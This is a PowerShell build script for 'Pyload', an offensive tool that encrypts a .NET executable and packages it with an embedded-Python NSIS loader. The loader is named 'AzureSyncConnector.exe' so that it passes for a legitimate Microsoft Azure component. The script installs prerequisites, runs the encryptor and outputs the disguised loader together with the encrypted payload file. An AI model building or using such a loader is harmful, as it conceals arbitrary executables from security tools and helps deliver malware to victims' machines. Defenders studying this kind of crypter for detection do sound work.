[CmdletBinding()]
param (   
    [string]$PathToFile,
    [string]$FileArgs,
    [string]$Key
)

if (-not $PathToFile){
    Write-Host "[!] Need a Path to .NET PE File" -ForegroundColor DarkRed
    exit 1
}


if (-not $FileArgs){
	Write-Host "[!] PE will encrypted withouuttt args"
}

if (-not $Key){
    Write-Host "[!] Need a Key" -ForegroundColor DarkRed
    exit 1
}

$ErrorActionPreference = "Stop"

#############################################################
Write-Host ""
Write-Host "###################################################" -ForegroundColor DarkYellow
Write-Host "	PYLOAD	" -ForegroundColor DarkRed
write-host "Written By ShkudW -> https://github.com/ShkudW/Pyload" -ForegroundColor DarkRed
Write-Host "###################################################" -ForegroundColor DarkYellow
Write-Host ""

$nsisPath = "C:\Program Files (x86)\NSIS\makensisw.exe"
if (-not (Test-Path $nsisPath)) {
    $response = Read-Host "NSIS was not found on this system. Would you like to download and install it now? (Y/N)"
    if ($response -eq 'Y' -or $response -eq 'y') {
        Write-Host "[!] Downloading NSIS installer..." -ForegroundColor DarkGray
        $nsisUrl = "https://sourceforge.net/projects/nsis/files/NSIS%203/3.10/nsis-3.10-setup.exe/download"
        $nsisInstaller = "$env:TEMP\nsis-setup.exe"
        
        Invoke-WebRequest -Uri $nsisUrl -OutFile $nsisInstaller -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
        
        Write-Host "[!] Running NSIS installer..." -ForegroundColor DarkGray
        Start-Process -FilePath $nsisInstaller -ArgumentList "/S" -Wait
        Remove-Item $nsisInstaller -Force -ErrorAction SilentlyContinue
    } else {
        Write-Error "[-] NSIS is required to proceed. Operation aborted."
        exit
    }
} else {
    Write-Host "[+] NSIS is installed." -ForegroundColor DarkGreen
}

#############################################################

$pythonInAppData = Test-Path "$env:LOCALAPPDATA\Programs\Python"
$pythonInProgramFiles = (Test-Path "C:\Program Files\Python3*") -or (Test-Path "C:\Program Files (x86)\Python3*")
$pythonInPath = Get-Command python -ErrorAction SilentlyContinue

if (-not ($pythonInAppData -or $pythonInProgramFiles -or $pythonInPath)) {
    Write-Host "[-] Python was not found. Downloading installer..." -ForegroundColor DarkGray
    $pythonUrl = "https://www.python.org/ftp/python/3.13.1/python-3.13.1-amd64.exe"
    $pythonInstaller = "$env:TEMP\python-installer.exe"
    
    Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller
    
    Write-Host "[!] Installing Python as Administrator..." -ForegroundColor DarkGray
    $installArgs = "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0"
    Start-Process -FilePath $pythonInstaller -ArgumentList $installArgs -Verb RunAs -Wait
    
    Remove-Item $pythonInstaller -Force -ErrorAction SilentlyContinue
    
    $machinePath = [System.Environment]::GetEnvironmentVariable('Path', 'Machine')
    $userPath = [System.Environment]::GetEnvironmentVariable('Path', 'User')
    $env:Path = "$machinePath;$userPath"
} else {
    Write-Host "[+] Python is installed." -ForegroundColor DarkGreen
}

#############################################################

python -m venv venv
.\venv\Scripts\activate.ps1

python -m pip install --upgrade pip
pip install python-embedded-launcher

if (-not (Test-Path "python-embedded-launcher")) {
    git clone https://github.com/zsquareplusc/python-embedded-launcher.git
}

pip install -r .\python-embedded-launcher\requirements.txt
python -m launcher_tool.download_python3_minimal --this-version --64

##############
$content = @"
python313.zip
.

import site
"@

$pthPath = "python3-minimal\python313._pth"
if (Test-Path "python3-minimal") {
    [System.IO.File]::WriteAllText(
        (Resolve-Path $pthPath),
        $content,
        [System.Text.Encoding]::ASCII
    )
}

##############

Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile "get-pip.py"
.\python3-minimal\python.exe .\get-pip.py
Remove-Item "get-pip.py" -Force -ErrorAction SilentlyContinue


.\python3-minimal\python.exe -m pip install pythonnet cryptography --target python3-minimal --no-warn-script-location


Write-Host "[+] Encrypting the PE" -ForegroundColor DarkGray

python -m pip install cryptography
python .\Encryptor.py $PathToFile -a $FileArgs -k $Key
python .\PreBuild.py


Write-Host "[+] Compiling the Loader" -ForegroundColor DarkGray
$makerExe = "C:\Program Files (x86)\NSIS\makensis.exe"

if (Test-Path $makerExe) {
    & $makerExe /V4 .\BuiltEXE.nsi
    Write-Host "[+] Build completed successfully!" -ForegroundColor DarkGreen
	
	deactivate
	New-Item -ItemType Directory -Path "Build" | Out-Null
	rm py.py
	rm venv -Recurse -Force
	rm .\python-embedded-launcher\ -Recurse -Force
	rm python3-minimal -Recurse -Force
	rm hisotryCPU.txt
	move-item .\AzureSyncConnector.exe .\Build
	move-item .\P.txt .\Build
	write-host "[!] You Can find the Loader and the encrypted PE in Build Folder" -ForegroundColor DarkGray
	write-host "[^.^] Usage:" -ForegroundColor DarkGray
	Write-host "	AzureSyncConnector.exe P.txt -k $($Key)" -ForegroundColor DarkGreen

	
} else {
    Write-Error "Cannot find makensis.exe at $makerExe"
}
